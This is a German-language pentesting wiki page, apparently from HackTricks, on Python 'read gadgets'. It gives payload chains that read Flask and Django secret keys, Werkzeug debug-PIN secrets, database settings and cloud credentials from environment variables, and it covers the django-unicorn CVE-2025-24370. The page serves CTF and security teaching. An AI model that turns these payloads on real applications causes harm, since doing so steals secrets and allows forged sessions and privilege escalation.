# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Verschiedene Schwachstellen wie [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) oder [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) können es ermöglichen, dass du **python-interne Daten lesen kannst**, erlauben jedoch nicht, Code auszuführen. Deshalb muss ein pentester diese Lese-Berechtigungen optimal nutzen, um **sensible Privilegien zu erhalten und die Schwachstelle zu eskalieren**.

### Flask - Read secret key

Die Hauptseite einer Flask-Anwendung wird wahrscheinlich das globale Objekt **`app`** enthalten, in dem dieses **secret konfiguriert** ist.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In diesem Fall ist es möglich, auf dieses Objekt zuzugreifen, indem man einfach ein beliebiges Gadget verwendet, um **access global objects** von der [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

Falls **the vulnerability is in a different python file**, benötigen Sie ein Gadget, um Dateien zu durchqueren, um zur Hauptdatei zu gelangen, um **access the global object `app.secret_key`** und den Flask secret key zu ändern und so [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) zu können.

Ein payload wie dieses [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Verwende diesen payload, um **`app.secret_key` zu ändern** (der Name in deiner App könnte anders sein), um neue und höher privilegierte flask cookies signieren zu können.

### Werkzeug - machine_id und node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) wirst du Zugriff auf die **machine_id** und den **uuid** node erhalten, welche die **main secrets** sind, die du brauchst, um den [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) zu erzeugen, mit dem du auf die python console in `/console` zugreifen kannst, falls der **debug mode** aktiviert ist:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Beachte, dass du den **lokalen Pfad des Servers zur `app.py`** erhalten kannst, indem du eine **Fehlermeldung** auf der Webseite erzeugst, die dir **den Pfad liefert**.

Wenn die Schwachstelle in einer anderen python-Datei liegt, siehe den vorherigen Flask-Trick, um auf die Objekte aus der Haupt-python-Datei zuzugreifen.

### Django - SECRET_KEY und settings module

Das Django settings-Objekt wird beim Start der Anwendung in `sys.modules` zwischengespeichert. Mit nur read primitives kannst du die **`SECRET_KEY`**, Datenbankzugangsdaten oder Signing-Salts leak:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
Wenn das vulnerable gadget sich in einem anderen module befindet, durchsuchen Sie zuerst globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
Sobald der Key bekannt ist, kannst du Django signed cookies oder Tokens ähnlich wie bei Flask fälschen.

### Environment variables / cloud creds via loaded modules

Viele jails importieren irgendwo noch `os` oder `sys`. Du kannst jede erreichbare Funktion `__init__.__globals__` missbrauchen, um auf das bereits importierte `os`-Modul zu pivoten und **environment variables** auszulesen, die API tokens, cloud keys oder flags enthalten:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Wenn der Subclass-Index gefiltert ist, verwende loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Umgebungsvariablen sind häufig die einzigen Geheimnisse, die benötigt werden, um vom bloßen Lesen zur vollständigen Kompromittierung zu gelangen (cloud IAM keys, database URLs, signing keys usw.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) erlaubte **class pollution** durch manipulierte component requests. Das Setzen eines property path wie `__init__.__globals__` ermöglicht es einem Angreifer, auf die Modul‑globals der Komponente und alle importierten Module (z. B. `settings`, `os`, `sys`) zuzugreifen. Von dort aus können Sie `SECRET_KEY`, `DATABASES` oder Service-Credentials leak, ohne Codeausführung. Die Exploit-Kette ist rein read-based und verwendet dieselben dunder-gadget patterns wie oben.

### Gadget collections for chaining

Jüngste CTFs (z. B. jailCTF 2025) zeigen zuverlässige read chains, die ausschließlich über attribute access und subclass enumeration aufgebaut werden. Community-gepflegte Listen wie [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) katalogisieren Hunderte minimaler gadgets, die sich kombinieren lassen, um von Objekten zu `__globals__`, `sys.modules` und letztlich zu sensiblen Daten zu gelangen. Nutzen Sie sie, um sich schnell anzupassen, wenn Indizes oder Klassennamen zwischen Python-Minor-Versionen abweichen.



## Referenzen

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
